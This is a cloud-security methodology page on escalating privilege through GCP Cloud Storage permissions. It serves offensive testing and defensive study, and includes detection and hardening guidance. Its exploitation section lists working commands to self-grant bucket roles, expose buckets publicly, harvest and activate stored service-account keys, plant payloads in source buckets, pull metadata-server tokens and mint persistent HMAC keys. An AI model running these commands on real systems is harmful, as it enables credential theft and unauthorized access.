---
cstg_id: CSTG-GCP-CLOUD-STORAGE-PRIVESC
title: "GCP Cloud Storage - Privilege Escalation"
provider: gcp
service: cloud-storage
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - storage.buckets.setIamPolicy
  - storage.objects.create
  - storage.objects.update
  - storage.objects.get
  - storage.buckets.get
  - storage.hmacKeys.create
  - resourcemanager.projects.get
tools: ["gcloud storage", "gsutil", "gcloud", "GCP JSON API", "PMapper", "ScoutSuite"]
references:
  - "https://cloud.google.com/storage/docs/access-control/iam-permissions"
  - "https://cloud.google.com/storage/docs/access-control/iam-roles"
  - "https://cloud.google.com/storage/docs/authentication/hmackeys"
  - "https://cloud.google.com/storage/docs/access-control/signed-urls"
  - "https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/"
  - "https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/"
  - "https://cloud.google.com/functions/docs/securing/function-identity"
license: CC BY-SA 4.0
---

## Summary

This page enumerates privilege-escalation paths that begin with - or pivot
through - Cloud Storage permissions held by an already-compromised identity
("assumed breach"). Cloud Storage is a frequent escalation vector for two
reasons. First, write or IAM-modification permissions on a bucket let an
attacker grant themselves broader access or expose data publicly. Second,
storage buckets routinely **contain** material that grants higher privilege:
service-account keys, Terraform state, application source consumed by build
pipelines, and configuration read by privileged compute workloads.

Each subsection below is keyed to a specific permission and describes the
concrete path it enables. The attacker objective is to convert limited storage
access into broader IAM privilege, persistent credentials, or control of data
that other privileged systems trust.

## Prerequisites

- A compromised principal (user or service account) with one or more of the
  storage permissions listed in `required_permissions`, established via
  enumeration in
  [GCP Cloud Storage - Enumeration](../02-services/gcp-cloud-storage-enum.md).
- Knowledge of which buckets the principal can act on and what they contain.
- For paths that pivot into compute, the relevant project IDs and an
  understanding of which service accounts read which buckets.

## Misconfigurations & Findings

- A principal that can modify bucket IAM (`storage.buckets.setIamPolicy`) but is
  not intended to be a storage admin.
- Write access (`storage.objects.create` / `update`) to buckets whose contents
  are consumed by privileged pipelines, functions, or instances.
- Ability to mint **HMAC keys** (`storage.hmacKeys.create`) for service accounts,
  yielding long-lived, IAM-decoupled credentials.
- Buckets containing service-account JSON keys, `tfstate`, startup scripts, or
  CI/CD secrets that the current identity can read.
- Buckets backing **App Engine / Cloud Functions / Cloud Build** source that the
  current identity can overwrite.

## Exploitation

### storage.buckets.setIamPolicy

Holding this permission on a bucket lets the attacker rewrite that bucket's IAM
policy - including granting **themselves** a higher storage role, or granting
`allUsers`. This is a direct self-escalation on the resource.

```bash
# Read current policy
gcloud storage buckets get-iam-policy gs://<BUCKET> --format=json > policy.json

# Grant self objectAdmin (full object read/write/delete)
gcloud storage buckets add-iam-policy-binding gs://<BUCKET> \
  --member="user:attacker@example.com" \
  --role="roles/storage.objectAdmin"

# Or expose publicly to stage exfiltration outside the perimeter
gcloud storage buckets add-iam-policy-binding gs://<BUCKET> \
  --member="allUsers" --role="roles/storage.objectViewer"
```

Note this escalation is bucket-scoped; it does not grant project IAM. Its value
is unlocking read/write to data that drives the paths below.

### storage.objects.get

Read access is itself an escalation primitive when the bucket stores
credentials. The classic chain:

```bash
# Hunt for service-account keys and state files
gsutil ls -r gs://<BUCKET>/** | grep -Ei '\.json$|tfstate|\.env|credentials'

gsutil cp gs://<BUCKET>/path/sa-key.json ./sa-key.json
gcloud auth activate-service-account --key-file=./sa-key.json
gcloud auth list   # now operating as the higher-privileged service account
```

`tfstate` files frequently embed plaintext secrets (DB passwords, API keys,
generated SA keys), and `.env`/CI config files leak tokens. Each recovered
credential is a separate escalation to whatever that credential can do.

### storage.objects.create / storage.objects.update

Write access to a bucket consumed by a **privileged executor** lets the attacker
inject code that runs with that executor's identity:

- **Cloud Functions / App Engine source bucket.** Overwriting the deployed
  source archive (e.g. `gs://<PROJECT>.appspot.com/...` or the function's source
  bucket) causes the next deploy/invocation to execute attacker code as the
  function's runtime service account.
- **Cloud Build / CI artifacts.** Replacing a build input or script executes in
  the build service account context (often highly privileged).
- **Compute startup scripts / config.** If an instance's startup script or a
  config file it fetches lives in a writable bucket, the next boot or config
  pull runs attacker commands as the instance service account.
- **Data poisoning of trusted assets.** Overwriting JS/HTML served to users, or
  data ingested by downstream analytics, enables supply-chain and stored-XSS
  style impact.

```bash
echo 'malicious payload' > app.js
gsutil cp app.js gs://<SOURCE_BUCKET>/app.js
# Trigger or wait for the privileged consumer to pick it up
```

Once code runs on a compute resource, harvest its identity token:

```bash
curl -H "Metadata-Flavor: Google" \
 "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

### storage.hmacKeys.create

HMAC keys are long-lived access-key/secret pairs bound to a service account that
authenticate to the XML API. If the attacker can create an HMAC key for a
service account they can act as, they obtain a **persistent credential that does
not appear in OAuth token flows** and survives many credential-rotation
controls:

```bash
gcloud storage hmac create <SERVICE_ACCOUNT_EMAIL>
# Returns accessId + secret; usable with S3-compatible / XML API tooling
```

If the principal can create HMAC keys for a **more privileged** service account
in the project, this is a direct escalation to that account's storage access and
a durable persistence mechanism.

### storage.buckets.get / resourcemanager.projects.get

These are not escalations alone but are the discovery glue that makes the above
paths reachable: identifying which buckets exist, their access mode, and which
service accounts consume them. They are listed because real chains require them.

### Chaining out of storage

A recovered service-account key or runtime token may itself hold
escalation-capable IAM permissions outside storage (e.g.
`iam.serviceAccounts.getAccessToken`, `iam.serviceAccountKeys.create`,
`deploymentmanager.deployments.create`, `cloudfunctions.functions.create`). The
storage compromise is frequently the **first hop**; subsequent hops are covered
by the project-level IAM privilege-escalation pages.

## Detection & Logging

- **Admin Activity logs (always on):** `storage.setIamPermissions` /
  `SetIamPolicy` on a bucket, and `google.iam.admin.v1` HMAC key creation
  (`CreateHmacKey`), are recorded with the actor in
  `protoPayload.authenticationInfo.principalEmail`. A binding adding `allUsers`
  or self is a high-signal alert.
- **Data Access logs (if enabled):** `storage.objects.create`/`update` (writes)
  appear as DATA_WRITE; reads of credential files appear as DATA_READ. A
  privileged identity suddenly reading many `.json`/`tfstate` objects is
  anomalous.
- **Service-account key activation** off-platform is invisible until the key is
  used; subsequent API calls show the new principal acting from a new
  IP/location.
- **HMAC key creation** is a strong persistence indicator - alert on any
  `CreateHmacKey` outside known automation.
- **Source-bucket overwrites** followed by a function/build redeploy is a
  detectable sequence in Cloud Functions / Cloud Build audit logs.
- **Security Command Center / Event Threat Detection** surfaces anomalous IAM
  grants and added-public-access findings.

## Remediation & Hardening

- **Least privilege on bucket IAM:** restrict `storage.buckets.setIamPolicy` to
  storage admins only; separate object access from policy administration.
- **Block public grants** with `constraints/storage.publicAccessPrevention`
  (enforced) so a compromised `setIamPolicy` cannot expose data.
- **Disable HMAC keys** where unused via
  `constraints/storage.restrictAuthTypes`, and alert on `CreateHmacKey`.
- **Never store secrets in buckets.** Use Secret Manager; keep service-account
  keys out of storage and prefer keyless workload identity.
- **Protect source/config buckets:** make function/build/source buckets
  read-only to deploy automation, enable object versioning + retention, and
  separate them from data buckets.
- **Enable Data Access audit logging** for storage to detect credential reads
  and writes.
- **Apply VPC Service Controls** so even valid stolen credentials cannot
  exfiltrate or self-grant across the perimeter boundary.
- **Run PMapper/ScoutSuite** to find identities whose storage permissions create
  unintended escalation edges.

## Tools

- **gcloud / gsutil / gcloud storage** - IAM modification, object read/write,
  HMAC key creation, SA key activation.
- **GCP JSON/XML API** - scripted exploitation with bearer tokens or HMAC keys.
- **PMapper** - graphs IAM to surface storage-driven escalation edges.
- **ScoutSuite** - identifies over-permissioned principals and public buckets.

## References

- IAM permissions for Cloud Storage: https://cloud.google.com/storage/docs/access-control/iam-permissions
- IAM roles for Cloud Storage: https://cloud.google.com/storage/docs/access-control/iam-roles
- HMAC keys: https://cloud.google.com/storage/docs/authentication/hmackeys
- Signed URLs: https://cloud.google.com/storage/docs/access-control/signed-urls
- GCP privilege escalation part 1 (Rhino Security Labs): https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
- GCP privilege escalation part 2 (Rhino Security Labs): https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/
- Cloud Functions identity: https://cloud.google.com/functions/docs/securing/function-identity
